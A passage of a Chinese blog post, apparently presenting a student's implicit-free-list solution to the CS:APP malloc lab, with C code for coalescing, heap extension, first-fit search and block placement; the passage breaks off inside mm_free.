class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="8"><li>static void <em>coalesce(void</em>bp);</li></ol><p>合并空余空间函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">coalesce</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>bp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">size_t</span> prev_alloc<span class="token operator">=</span><span class="token function">GET_ALLOC</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span><span class="token function">PREV_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">size_t</span> next_alloc<span class="token operator">=</span><span class="token function">GET_ALLOC</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">size_t</span> size <span class="token operator">=</span><span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>prev_alloc <span class="token operator">&amp;&amp;</span> next_alloc<span class="token punctuation">)</span>    <span class="token keyword">return</span> bp<span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>prev_alloc <span class="token operator">==</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span>next_alloc<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//后面的块是空闲块，则指针不变，合并后面的块</span>        size<span class="token operator">+=</span><span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//</span>          <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>next_alloc<span class="token operator">==</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span> prev_alloc<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//前面的块空闲</span>        size<span class="token operator">+=</span><span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span><span class="token function">PREV_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        bp<span class="token operator">=</span><span class="token function">PREV_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        size<span class="token operator">+=</span><span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span><span class="token function">PREV_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        size<span class="token operator">+=</span><span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        bp<span class="token operator">=</span><span class="token function">PREV_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">return</span> bp<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>完整代码：</strong></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* * mm-naive.c - The fastest, least memory-efficient malloc package. *  * In this naive approach, a block is allocated by simply incrementing * the brk pointer.  A block is pure payload. There are no headers or * footers.  Blocks are never coalesced or reused. Realloc is * implemented directly using mm_malloc and mm_free. * * NOTE TO STUDENTS: Replace this header comment with your own header * comment that gives a high level description of your solution. */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"mm.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"memlib.h"</span></span><span class="token comment">/********************************************************* * NOTE TO STUDENTS: Before you do anything else, please * provide your team information in the following struct. ********************************************************/</span><span class="token class-name">team_t</span> team <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/* Team name */</span>    <span class="token string">"Vite Fuck"</span><span class="token punctuation">,</span>    <span class="token comment">/* First member's full name */</span>    <span class="token string">"zhz_vite"</span><span class="token punctuation">,</span>    <span class="token comment">/* First member's email address */</span>    <span class="token string">"2811215248@qq.com"</span><span class="token punctuation">,</span>    <span class="token comment">/* Second member's full name (leave blank if none) */</span>    <span class="token string">""</span><span class="token punctuation">,</span>    <span class="token comment">/* Second member's email address (leave blank if none) */</span>    <span class="token string">""</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">/* single word (4) or double word (8) alignment */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ALIGNMENT</span> <span class="token expression"><span class="token number">8</span></span></span><span class="token comment">/* rounds up to the nearest multiple of ALIGNMENT */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">ALIGN</span><span class="token expression"><span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>ALIGNMENT<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token number">0x7</span><span class="token punctuation">)</span></span><span class="token comment">//会得到大于等于size的最小整数</span></span><span class="token comment">//(size) + (ALIGNMENT-1)会得到最接近但不大于其alignment的倍数</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SIZE_T_SIZE</span> <span class="token expression"><span class="token punctuation">(</span><span class="token function">ALIGN</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token comment">/* $begin mallocmacros */</span><span class="token comment">/* Basic constants and macros */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">WSIZE</span>       <span class="token expression"><span class="token number">4</span>       </span><span class="token comment">/* Word and header/footer size (bytes) */</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DSIZE</span>       <span class="token expression"><span class="token number">8</span>       </span><span class="token comment">/* Double word size (bytes) */</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CHUNKSIZE</span>  <span class="token expression"><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">&lt;&lt;</span><span class="token number">12</span><span class="token punctuation">)</span>  </span><span class="token comment">/* Extend heap by this amount (bytes) */</span>  </span> <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">MAX</span><span class="token expression"><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token operator">?</span> <span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span>  </span></span> <span class="token comment">/* Pack a size and allocated bit into a word */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">PACK</span><span class="token expression"><span class="token punctuation">(</span>size<span class="token punctuation">,</span> alloc<span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>alloc<span class="token punctuation">)</span><span class="token punctuation">)</span> </span><span class="token comment">//打包头部的值，再用PUT（p,PACK(size,alloc)),之类的函数把他丢进header/footer</span></span> <span class="token comment">/* Read and write a word at address p */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">GET</span><span class="token expression"><span class="token punctuation">(</span>p<span class="token punctuation">)</span>       <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span> </span><span class="token comment">//获得p指向的值           </span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">PUT</span><span class="token expression"><span class="token punctuation">(</span>p<span class="token punctuation">,</span> val<span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">)</span>    </span><span class="token comment">//写入val与p指向地址</span></span> <span class="token comment">/* Read the size and allocated fields from address p */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">GET_SIZE</span><span class="token expression"><span class="token punctuation">(</span>p<span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token function">GET</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token number">0x7</span><span class="token punctuation">)</span>                   </span><span class="token comment">//由于双字对齐条件约束，故释放最低三位，即得到的unsigned int 值为多少倍的DSIZE</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">GET_ALLOC</span><span class="token expression"><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token function">GET</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x1</span><span class="token punctuation">)</span>                    </span><span class="token comment">//有无分配</span></span> <span class="token comment">/* Given block ptr bp, compute address of its header and footer */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">HDRP</span><span class="token expression"><span class="token punctuation">(</span>bp<span class="token punctuation">)</span>       <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span> <span class="token operator">-</span> WSIZE<span class="token punctuation">)</span>                      </span><span class="token comment">//the address of the header</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">FTRP</span><span class="token expression"><span class="token punctuation">(</span>bp<span class="token punctuation">)</span>       <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> DSIZE<span class="token punctuation">)</span> </span><span class="token comment">//the address of the footer</span></span> <span class="token comment">/* Given block ptr bp, compute address of next and previous blocks */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">NEXT_BLKP</span><span class="token expression"><span class="token punctuation">(</span>bp<span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span> <span class="token operator">-</span> WSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> </span><span class="token comment">//next blocks pointer</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">PREV_BLKP</span><span class="token expression"><span class="token punctuation">(</span>bp<span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span> <span class="token operator">-</span> DSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> </span><span class="token comment">//prev blocks pointer</span></span> <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MINBLOCK</span> <span class="token expression"><span class="token punctuation">(</span>DSIZE<span class="token operator">+</span><span class="token number">2</span><span class="token operator">*</span>WSIZE<span class="token punctuation">)</span></span></span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span>heap_listp<span class="token punctuation">;</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">extend_heap</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> words<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">find_fit</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">place</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span>bp<span class="token punctuation">,</span><span class="token class-name">size_t</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">coalesce</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/*  * mm_init - initialize the malloc package. */</span><span class="token keyword">int</span> <span class="token function">mm_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span>  <span class="token punctuation">(</span><span class="token punctuation">(</span>heap_listp <span class="token operator">=</span> <span class="token function">mem_sbrk</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">*</span>WSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>     <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token function">PUT</span><span class="token punctuation">(</span>heap_listp<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token function">PUT</span><span class="token punctuation">(</span>heap_listp<span class="token operator">+</span>WSIZE<span class="token punctuation">,</span><span class="token function">PACK</span><span class="token punctuation">(</span>DSIZE<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">PUT</span><span class="token punctuation">(</span>heap_listp<span class="token operator">+</span><span class="token number">2</span><span class="token operator">*</span>WSIZE<span class="token punctuation">,</span><span class="token function">PACK</span><span class="token punctuation">(</span>DSIZE<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">PUT</span><span class="token punctuation">(</span>heap_listp<span class="token operator">+</span><span class="token number">3</span><span class="token operator">*</span>WSIZE<span class="token punctuation">,</span><span class="token function">PACK</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    heap_listp<span class="token operator">+=</span><span class="token number">2</span><span class="token operator">*</span>WSIZE<span class="token punctuation">;</span><span class="token comment">//将heap_listp指针移到序言和结尾块之间</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">extend_heap</span><span class="token punctuation">(</span>CHUNKSIZE<span class="token punctuation">)</span><span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">extend_heap</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> words<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//扩展堆函数,开一个新的空闲块</span>    <span class="token keyword">void</span> <span class="token operator">*</span>bp<span class="token punctuation">;</span><span class="token comment">//</span>    <span class="token class-name">size_t</span> size<span class="token punctuation">;</span>    size<span class="token operator">=</span><span class="token function">ALIGN</span><span class="token punctuation">(</span>words<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//填充</span>   <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp<span class="token operator">=</span><span class="token function">mem_sbrk</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">//注意这个（void*)</span>   <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//</span>    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">PACK</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建一个新的结尾块</span>    <span class="token keyword">return</span> <span class="token function">coalesce</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//开完后看能不能和前面的合并</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span><span class="token operator">*</span> <span class="token function">find_fit</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//在空闲块中看能否找到一个>=size的块，first fit</span>    <span class="token keyword">void</span> <span class="token operator">*</span>ffbp<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>ffbp<span class="token operator">=</span>heap_listp<span class="token punctuation">;</span><span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>ffbp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">;</span>ffbp<span class="token operator">=</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>ffbp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">GET_ALLOC</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>ffbp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token operator">&amp;&amp;</span><span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>ffbp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">>=</span>size<span class="token punctuation">)</span>        <span class="token keyword">return</span> ffbp<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span>  <span class="token keyword">void</span>  <span class="token function">place</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>bp<span class="token punctuation">,</span><span class="token class-name">size_t</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">size_t</span> asize <span class="token operator">=</span><span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">size_t</span> resize <span class="token operator">=</span>asize<span class="token operator">-</span>size<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>resize<span class="token operator">>=</span>MINBLOCK<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        bp<span class="token operator">=</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">PACK</span><span class="token punctuation">(</span>resize<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//后部分置为空</span>        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">PACK</span><span class="token punctuation">(</span>resize<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">PACK</span><span class="token punctuation">(</span>asize<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">PACK</span><span class="token punctuation">(</span>asize<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">/*  * mm_malloc - Allocate a block by incrementing the brk pointer. *     Always allocate a block whose size is a multiple of the alignment. */</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">mm_malloc</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>bp<span class="token operator">=</span><span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token class-name">size_t</span> extendsize<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>size<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>size<span class="token operator">&lt;=</span>DSIZE<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        size<span class="token operator">=</span><span class="token number">2</span><span class="token operator">*</span>DSIZE<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        size<span class="token operator">=</span><span class="token function">ALIGN</span><span class="token punctuation">(</span>size<span class="token operator">+</span>DSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>bp<span class="token operator">=</span><span class="token function">find_fit</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">place</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> <span class="token punctuation">)</span>bp<span class="token punctuation">,</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> bp<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    extendsize <span class="token operator">=</span> <span class="token function">MAX</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>CHUNKSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//扩展堆</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>bp <span class="token operator">=</span> <span class="token function">extend_heap</span> <span class="token punctuation">(</span>extendsize<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>     <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>     <span class="token function">place</span><span class="token punctuation">(</span>bp<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">return</span> bp<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/* * mm_free - Freeing a block does nothing. */</span><span class="token keyword">void</span> <span class="token function">mm_free</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    